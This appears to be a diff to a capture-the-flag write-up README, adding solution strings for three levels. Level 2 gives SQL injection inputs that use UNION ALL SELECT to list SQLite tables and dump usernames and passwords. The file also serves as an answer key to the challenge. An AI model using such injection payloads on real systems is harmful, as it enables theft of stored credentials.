@@ -31,17 +31,23 @@
 	
 	* Level 0
 		* Base64Password: TkdGbFpqRmxNbUV6
+		* Decrypted password and solution is therefore: NGFlZjFlMmEz
 		* ![Level0](img/level_0.PNG)	
 
 	* Level 1
 		* Piet:NTY5M2IyYTc2
+		* Solution is therefore: NTY5M2IyYTc2
 		* ![Level1](img/level_1.PNG)	
 
 	* Level 2
 		* input=1+Union+ALL+SELECT+1,2,3,name+from+sqlite_master
+		* ![Level2](img/level_2.PNG)
 		* the users table became OTg5ZmMyZWM1 table
 		* input=1+Union+ALL+SELECT+1,id,name,password+from+OTg5ZmMyZWM1	
-		* ![Level2](img/level_2.PNG)
+		* ![Level2](img/level_2_piet.PNG)
+		* Trying to come up with a similar solution for level 1 which was the password for user "Piet", we can try to do the same here and use his password.
+		* Solution is therefore: NTJjOGRiYmUx
+		
 
 
 
